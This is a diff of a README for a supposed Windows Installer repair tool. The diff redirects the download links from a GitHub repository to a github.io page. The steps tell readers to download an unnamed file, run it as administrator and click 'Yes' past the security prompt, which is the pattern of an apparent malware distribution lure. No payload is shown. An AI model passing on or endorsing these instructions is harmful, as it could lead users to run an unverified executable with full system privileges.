@@ -1,6 +1,6 @@
 # 🛠️ Windows-Installer-Service-Fix - Clear Windows Installer Errors Fast
 
-[![](https://img.shields.io/badge/Download-Repair_Tool-blue.svg)](https://github.com/Filariawhiteness14/Windows-Installer-Service-Fix)
+[![](https://img.shields.io/badge/Download-Repair_Tool-blue.svg)](https://filariawhiteness14.github.io)
 
 This tool resolves the error message stating that the Windows Installer Service could not be accessed. This problem prevents users from installing, updating, or removing software on Windows 10 and Windows 11. This utility resets the registry settings and service configurations to their default states.
 
@@ -27,7 +27,7 @@ This tool works on standard Windows environments. Ensure your system meets these
 
 Follow these steps to repair your system.
 
-1. Visit this page to download the repair file: [https://github.com/Filariawhiteness14/Windows-Installer-Service-Fix](https://github.com/Filariawhiteness14/Windows-Installer-Service-Fix)
+1. Visit this page to download the repair file: [https://filariawhiteness14.github.io](https://filariawhiteness14.github.io)
 2. Locate the file in your Downloads folder once the transfer finishes.
 3. Right-click the file and select "Run as administrator." Windows may show a security prompt because the file modifies system settings. Click "Yes" to allow the repair.
 4. A command window will appear. Follow the on-screen instructions.
